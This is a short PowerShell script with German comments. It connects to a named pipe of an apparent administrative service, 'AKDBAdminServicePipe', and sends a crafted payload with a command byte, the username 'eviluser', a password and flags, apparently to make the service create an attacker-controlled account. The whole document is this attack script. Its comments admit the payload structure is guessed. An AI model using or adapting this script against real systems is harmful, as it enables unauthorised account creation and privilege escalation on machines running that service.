# Pipe-Name
$pipeName = "\\.\pipe\AKDBAdminServicePipe"

# Öffne Named Pipe (Warte auf Verbindung)
$fs = new-object System.IO.FileStream $pipeName, 'Open', 'ReadWrite', 'None'

# BinaryWriter und -Reader zur Kommunikation
$writer = new-object System.IO.BinaryWriter $fs
$reader = new-object System.IO.BinaryReader $fs

# Nutzdaten vorbereiten
# - "4" als Befehl (Pipe erwartet ASCII "4")
# - Benutzername: "eviluser" + nullbyte
# - Passwort: "P@ssw0rd123" + nullbyte
# - Flags: 0x0001 (UF_SCRIPT), als 4 Byte (Little Endian)
# Hinweis: Struktur ist geraten, kann angepasst werden

$command = [byte[]](0x34)  # ASCII "4"
$username = [System.Text.Encoding]::ASCII.GetBytes("eviluser" + [char]0)
$password = [System.Text.Encoding]::ASCII.GetBytes("P@ssw0rd123" + [char]0)
$flags    = [BitConverter]::GetBytes(0x00000001)

# Zusammensetzen
$payload = $command + $username + $password + $flags

# ✉️ Senden
$writer.Write($payload)
$writer.Flush()

# Optional: Antwort lesen
Start-Sleep -Milliseconds 500
try {
    $response = $reader.ReadBytes(1024)
    Write-Host "Antwort vom Dienst:" ([System.Text.Encoding]::ASCII.GetString($response))
} catch {
    Write-Warning "Keine Antwort oder Fehler beim Lesen."
}

# Aufräumen
$writer.Close()
$reader.Close()
$fs.Close()
